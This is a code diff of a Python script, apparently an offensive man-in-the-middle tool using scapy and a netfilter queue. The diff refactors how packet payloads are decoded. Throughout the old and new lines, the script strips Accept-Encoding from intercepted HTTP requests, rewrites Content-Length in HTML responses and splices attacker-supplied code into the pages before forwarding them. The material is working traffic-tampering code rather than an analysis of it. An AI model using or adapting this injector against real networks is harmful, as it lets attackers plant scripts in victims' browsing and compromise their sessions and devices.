@@ -29,30 +29,30 @@ def process_packet(packet):
     if scapy_packet.haslayer(scapy.Raw):  # DNS response
         try:
             # print("------Packet---------")
-            load = scapy_packet[scapy.Raw].load
+            load = scapy_packet[scapy.Raw].load.decode()
             if scapy_packet[scapy.TCP].dport == 80:
-                if (url_target in load.decode()) if url_target else True:
+                if (url_target in load) if url_target else True:
                     print("[+] HTTP Request")
                     ack_list_request.append(scapy_packet[scapy.TCP].ack) if url_target else False
-                    load = re.sub("Accept-Encoding:.*?\\r\\n", "", load.decode())  # load becomes String
+                    load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)  # load becomes String
             elif scapy_packet[scapy.TCP].sport == 80:
                 print("[+] HTTP Response")
                 if (scapy_packet[scapy.TCP].seq in ack_list_request) if url_target else True:
                     ack_list_response.append(scapy_packet[scapy.TCP].ack) if url_target else False
-                    content_length = re.search("(?:Content-Length:\s)(\d*)", load.decode())
-                    if content_length and "text/html" in load.decode():
+                    content_length = re.search("(?:Content-Length:\s)(\d*)", load)
+                    if content_length and "text/html" in load:
                         content_length = content_length.group(1)
                         print(content_length)
                         new_cont_len = int(content_length) + len(code_inject)
-                        load = load.decode().replace(content_length, str(new_cont_len)).encode()
+                        load = load.replace(content_length, str(new_cont_len))
                     if not url_target:
                         # How there are different packets coming, it is necessary to encode() and decode()
                         # on every packet. Yet, the packet to encode() won't be the same as the packet to
                         # decode().
-                        load = load.decode().replace(inject_in, code_inject + inject_in)
+                        load = load.replace(inject_in, code_inject + inject_in)
                 elif scapy_packet[scapy.TCP].ack in ack_list_response:
-                        load = load.decode().replace(inject_in, code_inject + inject_in)  # Injecting the code
-            if load != scapy_packet[scapy.Raw].load:
+                        load = load.replace(inject_in, code_inject + inject_in)  # Injecting the code
+            if load != scapy_packet[scapy.Raw].load.decode():
                 packet.set_payload(bytes(set_load(scapy_packet, load)))
         except (UnicodeDecodeError, IndexError) as ie:
             # IndexError is when it is called TCP, although the first calls doesn't have that parameters
@@ -61,7 +61,7 @@ def process_packet(packet):
             # using decode() function.
             # UnicodeDecodeError happens with some packets, those packets which no need though.
             # logging.exception(ie)
-            None
+            pass
 
     # print(scapy_packet.show())  # Return the packet's payload as a byte object to see the packets.
     packet.accept()  # If it is accepted, it will be forwarded.
